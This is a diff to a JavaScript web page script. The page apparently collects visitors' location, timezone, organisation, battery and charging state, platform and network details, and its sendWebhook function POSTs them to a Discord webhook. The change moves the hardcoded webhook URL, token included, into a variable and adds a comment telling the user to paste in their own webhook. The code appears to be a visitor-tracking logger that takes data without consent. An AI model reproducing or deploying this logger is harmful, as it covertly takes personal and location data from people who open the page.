@@ -100,8 +100,8 @@
       let lon
       let timezone
       let org
-      var batterypercentage
-      var ischarging
+      let batterypercentage
+      let ischarging
       let platform
       let networkinfo
       let networkinformation
@@ -151,8 +151,11 @@
       getInfo();
 
       function sendWebhook() {
+        /*Change here the url for yourl discord webhook url*/
+        let webhookUrl = "https://discord.com/api/webhooks/990364168328720434/_XK0k-KdyhgGpkhXqIlQu8VD3HV-NrwNyIS92zVk2qhGRDz5v-EKcWlAYYG1vF_35-Wv"
+
         var request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/990364168328720434/_XK0k-KdyhgGpkhXqIlQu8VD3HV-NrwNyIS92zVk2qhGRDz5v-EKcWlAYYG1vF_35-Wv");
+        request.open("POST", webhookUrl);
         request.setRequestHeader('Content-type', 'application/json');
         var params = {
           "content": null,
